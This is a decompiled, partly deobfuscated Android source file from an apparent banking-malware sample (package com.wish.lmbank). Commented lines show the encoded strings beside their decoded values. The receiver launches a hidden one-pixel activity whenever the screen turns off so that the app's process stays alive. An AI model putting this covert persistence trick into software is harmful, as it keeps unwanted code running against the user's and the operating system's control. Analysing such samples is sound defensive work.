package com.wish.lmbank.keeplive.receiver;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import com.hgdendi.expandablerecycleradapter.ViewProducer;
import com.wish.lmbank.keeplive.activity.OnePixelActivity;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/receiver/OnepxReceiver.class */
public final class OnepxReceiver extends BroadcastReceiver {
    Handler mHander;
    boolean screenOn;

    public OnepxReceiver() {
        this.screenOn = true;
        this.mHander = new Handler(Looper.getMainLooper());
        return;
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        //             if (intent.getAction().equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzoqOywsJzYmLy8"))) {
        if (intent.getAction().equals("android.intent.action.SCREEN_OFF")) {
            this.screenOn = false;
            this.mHander.postDelayed(new Runnable() { // from class: com.wish.lmbank.keeplive.receiver.OnepxReceiver.1

                @Override // java.lang.Runnable
                public void run() {
                    if (OnepxReceiver.this.screenOn) {
                        return;
                    }
                    Intent intent2 = new Intent(context, OnePixelActivity.class);
                    intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    try {
                        PendingIntent.getActivity(context, 0, intent2, 0).send();
                        return;
                    } catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                }
            }, 1000L);
//                 context.sendBroadcast(new Intent(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Ji8v")));
            context.sendBroadcast(new Intent("_ACTION_SCREEN_OFF"));
//                 context.sendBroadcast(new Intent(bb7d7pu7.m5998("KCo9ICYnNjoqOywsJzYmLy8")));
            context.sendBroadcast(new Intent("ACTION_SCREEN_OFF"));
            return;
//             } else if (intent.getAction().equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRzoqOywsJzYmJw"))) {
        } else if (intent.getAction().equals("android.intent.action.SCREEN_ON")) {
            this.screenOn = true;
//                 context.sendBroadcast(new Intent(bb7d7pu7.m5998("NigqPSAmJzY6KjssLCc2Jic")));
            context.sendBroadcast(new Intent("_ACTION_SCREEN_ON"));
//                 context.sendBroadcast(new Intent(bb7d7pu7.m5998("KCo9ICYnNjoqOywsJzYmJw")));
            context.sendBroadcast(new Intent("ACTION_SCREEN_ON"));
            return;
        } else {
            return;
        }
    }
}
